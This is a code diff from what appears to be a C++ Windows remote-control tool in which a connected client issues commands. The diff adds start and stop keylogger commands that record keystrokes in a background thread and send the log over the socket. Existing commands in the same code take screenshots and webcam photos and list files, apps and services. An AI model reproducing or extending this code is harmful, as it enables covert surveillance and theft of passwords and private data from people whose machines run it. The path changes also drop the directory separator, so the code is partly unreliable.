@@ -41,10 +41,8 @@ ReceiveCommand::ReceiveCommand() : command(), parameter() {
                      //{"takephoto", new TakePhotoCommand},
                      //{"startrecord", new StartRecordCommand},
                      //{"stoprecord", new StopRecordCommand},
-                     //{"record", new RecordCommand},
-                     //{"startkeylog", new StartKeylogCommand},
-                     //{"stopkeylog", new StopKeylogCommand},
-                     //{"keylog", new KeylogCommand},
+                     {"startkeylog", new StartKeylogCommand},
+                     {"stopkeylog", new StopKeylogCommand},
                      });
 }
 
@@ -122,7 +120,7 @@ void ListFileCommand::execute(Server& server, const std::string& param){
     status = listFile(param);
 
     if (status == SUCCESS){
-        status = sendFile(server, directory + '\\' + output_file);
+        status = sendFile(server, directory + output_file);
         if (status == SUCCESS) {
             message = "Files at directory \\\"" + toRawString(param) + "\\\" were listed successfully.";
             file_name = output_file;
@@ -140,10 +138,10 @@ void ListFileCommand::execute(Server& server, const std::string& param){
 int ListFileCommand::listFile(const std::string& path){
     std::string command("dir /a-d ");
     output_file = "listfile.txt";
-    command.append(path + " > " + directory + '\\' + output_file);
+    command.append(path + " > " + directory + output_file);
     system(command.c_str());
 
-    std::ifstream fin(directory + '\\' + output_file);
+    std::ifstream fin(directory + output_file);
 
     if (!fin.is_open()){
         std::cout << "cannot open file";
@@ -162,7 +160,7 @@ int ListFileCommand::listFile(const std::string& path){
     fin.close();
     files.pop_back();
 
-    std::ofstream fout(directory + '\\' + output_file);
+    std::ofstream fout(directory + output_file);
     if (!fout.is_open()){
         std::cerr << "cannot open file write" << std::endl;
         return 2;
@@ -234,7 +232,7 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam){
 void ListAppCommand::execute(Server& server, const std::string& param){
     file_name = "";
     std::string output_file = "runningAppList.txt";
-    std::ofstream outFile(directory + '\\' + output_file);
+    std::ofstream outFile(directory + output_file);
     if (!outFile.is_open()) {
         std::cerr << "Unable to open file for writing.\n";
         status = 1;
@@ -253,7 +251,7 @@ void ListAppCommand::execute(Server& server, const std::string& param){
     //*sending applications to client
     SOCKET client_socket = server.getClientSocket();
 
-    status = sendFile(server, directory + '\\' + output_file);
+    status = sendFile(server, directory + output_file);
     
     if (status == SUCCESS) {
         file_name = output_file;
@@ -416,7 +414,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         return;
     }
 
-    std::string tmp = directory + '\\' + output_file;
+    std::string tmp = directory + output_file;
     Bitmap *bmp = new Bitmap(hBitmap, NULL);
     if (bmp->Save(std::wstring(tmp.begin(), tmp.end()).c_str(), &clsid, NULL) != Ok) {
         status = 1;
@@ -431,7 +429,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
     }
 
     std::cout << "sending screenshot" << std::endl;
-    sendFile(server, directory + '\\' + output_file);
+    sendFile(server, directory + output_file);
     status = 0;
     message = "Take screenshot successfully.";
     file_name = output_file;
@@ -510,7 +508,7 @@ void ListSerCommand::listRunningServices() {
 void ListSerCommand::execute(Server& server, const std::string& param) {
     listRunningServices();
     std::string output_file = "runningServiceList.txt";
-    status = sendFile(server, directory + '\\' + output_file);
+    status = sendFile(server, directory + output_file);
     
     file_name = "";
     if (status == SUCCESS) {
@@ -639,7 +637,7 @@ void TakePhotoCommand::execute(Server& server, const std::string& param){
     std::string outfile = "snapshot.png";
 
     if (status == SUCCESS){
-        status = sendFile(server, directory + '\\' + outfile);
+        status = sendFile(server, directory + outfile);
         if (status == SUCCESS){
             file_name = "snapshot.png";
             message = "Photo taken successfully\n\n";
@@ -657,5 +655,48 @@ void TakePhotoCommand::execute(Server& server, const std::string& param){
     server.echo(createResponse());
 }
 
+void StartKeylogCommand::execute(Server& server, const std::string& param) {
+    KeyLogger* kl = KeyLogger::getInstance(directory + "keylog.txt");
+    std::thread t(&KeyLogger::start, kl);
+    t.detach();
 
+    status = SUCCESS;
+    message = "Keylogger has been started.\\nUse \\\"stopkeylog\\\" command to stop keylogging and receive keylog file.";
+    server.echo(createResponse());
+}
+
+void StopKeylogCommand::execute(Server& server, const std::string& param) {
+    KeyLogger* kl = KeyLogger::getInstance();
+    if (kl->getStatus() != RUNNING) {
+        server.echo("NOT-RUNNING");
+        status = FAILURE;
+        message = "Keylogger has not been started.\\nUse \\\"startkeylog\\\" command to start the keylogger.";
+        server.echo(createResponse());
+        KeyLogger::deleteInstance();
+        return;
+    }
+
+    server.echo("RUNNING");
+    kl->stop();
+    Sleep(100);
+    status = kl->getStatus();
+    if (status == SUCCESS) {
+        status = sendFile(server, kl->getOutputFile());
+        if (status == SUCCESS) {
+            file_name = kl->getOutputFile();
+            if (file_name.rfind('\\') != string::npos) {
+                file_name = file_name.substr(file_name.rfind('\\') + 1);
+            }
+            message = "Send keylog file successfully.";
+        }
+        else {
+            message = "Error keylogger: Cannot send keylog file.";
+        }
+    }
+    else {
+        message = "Error keylogger: Cannot keylog.";
+    }
+    server.echo(createResponse());
+    KeyLogger::deleteInstance();
+}
 
